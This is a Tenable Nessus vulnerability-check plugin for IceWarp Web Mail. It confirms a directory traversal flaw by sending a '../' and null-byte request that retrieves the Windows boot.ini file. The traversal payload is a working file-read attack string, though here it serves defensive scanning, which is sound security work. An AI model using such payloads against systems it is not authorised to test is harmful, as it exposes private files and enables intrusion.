#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(19784);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2015/09/24 21:08:40 $");

 script_cve_id("CVE-2005-3131", "CVE-2005-3132", "CVE-2005-3133");
 script_bugtraq_id(14988, 14986, 14980);
 script_osvdb_id(19825, 19826, 19827, 19828, 19829, 19830, 19831);

 script_name(english:"IceWarp Web Mail Multiple Flaws (4)");
 script_summary(english:"Check the version of IceWarp WebMail");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to retrieve/delete local files on the remote system
through the webmail service." );
 script_set_attribute(attribute:"description", value:
"The remote host is running IceWarp Web Mail - a webmail solution
available for the Microsoft Windows platform. 

The remote version of this software is affected by a directory
traversal vulnerability that may allow an attacker to retrieve
arbitrary files on the system. 

Another input validation flaw allows an attacker to delete arbitrary
files on the remote host. 

Note this flaw indicates IceWarp is vulnerable to cross-site scripting
attacks too." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=112810385104168&w=2" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:P/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/30");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:icewarp:webmail");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

 script_dependencie("icewarp_webmail_vulns.nasl");
 script_require_ports("Services/www", 32000);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:32000);

version = get_kb_item("www/" + port + "/icewarp_webmail/version");
if ( ! version ) exit(0);

u = "/accounts/help.html?helpid=../../../../../../../../../../../../boot.ini%00";

w = http_send_recv3(method:"GET", item:u, port:port);
if (isnull(w)) exit(0);
r = w[2];

r = strstr (r, "[boot loader]");
if (isnull(r)) exit (0);

report = string ("It was possible to retrieve the file boot.ini :\n\n",	r);

security_hole (port:port, extra: report);
set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
